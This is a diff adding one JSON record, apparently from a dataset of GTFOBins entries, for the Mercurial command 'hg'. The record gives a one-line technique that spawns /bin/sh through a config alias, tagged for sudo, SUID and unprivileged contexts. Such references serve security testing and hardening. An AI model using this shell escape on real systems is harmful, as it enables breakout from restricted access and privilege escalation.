@@ -1,0 +1,1 @@
+{"title": "hg", "source": "gtfobins", "source_label": "GTFOBins", "path": "hg", "html": "<h1>hg</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">hg --config alias.x=&#x27;!/bin/sh&#x27; x</code></pre>", "excerpt": "hg Shell hg --config alias.x=&#x27;!/bin/sh&#x27; x", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}
